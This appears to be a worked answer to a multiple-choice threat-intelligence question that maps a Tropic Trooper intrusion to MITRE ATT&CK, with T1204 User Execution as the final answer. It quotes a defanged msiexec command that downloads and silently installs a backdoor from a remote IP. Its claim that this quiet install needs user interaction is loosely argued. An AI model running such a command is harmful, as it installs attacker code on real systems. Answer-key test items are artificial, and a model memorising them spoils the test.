**Step 1: Analyze the CTI Outline**

The CTI outline describes the attack sequence of Tropic Trooper, a threat actor, using the MITRE ATT&CK framework. The sequence is as follows:

1. Initial Access: Exploits for CVE-2017-11882 or CVE-2018-0802 in Microsoft Office's Equation Editor (EQNEDT32.EXE) to gain initial access.
2. Persistence: The backdoor is installed on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).
3. Defense Evasion: DLL hijacking to evade antivirus detection.
4. Command and Control: TClient uses SSL to connect to the C&C server.

**Step 2: Analyze the Question**

The question asks about the ATT&CK technique that most likely occurred when the execution of the backdoor's installer leveraged users' action or interaction to trigger its deployment.

**Step 3: Compare and Evaluate**

The question is asking about the technique used to deploy the backdoor's installer, which leverages users' action or interaction. Based on the CTI outline, the backdoor's installer was executed by the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]). This command is likely executed by a user, as it requires user interaction to run the installer.

The correct answer choice is the one that matches this scenario.

**Step 4: Step-by-Step Reasoning and Final Answer**

A. T1573-Encrypted Channel: This technique is not relevant to the deployment of the backdoor's installer.

B. T1564.009-Resource Forking: This technique is not relevant to the deployment of the backdoor's installer.

C. T1648-Serverless Execution: This technique is not relevant to the deployment of the backdoor's installer.

D. T1204-User Execution: This technique matches the scenario described in the CTI outline, where the backdoor's installer is executed by a user.

Final Answer: D
